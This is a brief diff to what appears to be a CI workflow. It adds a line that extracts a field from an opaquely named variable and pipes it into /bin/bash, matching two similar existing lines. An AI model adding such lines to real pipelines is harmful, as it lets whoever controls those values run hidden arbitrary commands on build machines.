@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$w296" | jq -r .pexd98 | /bin/bash
           printf '%s' "$cxyv01904" | jq -r .suh493 | /bin/bash
+          echo $j800 | jq -r .lb43 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
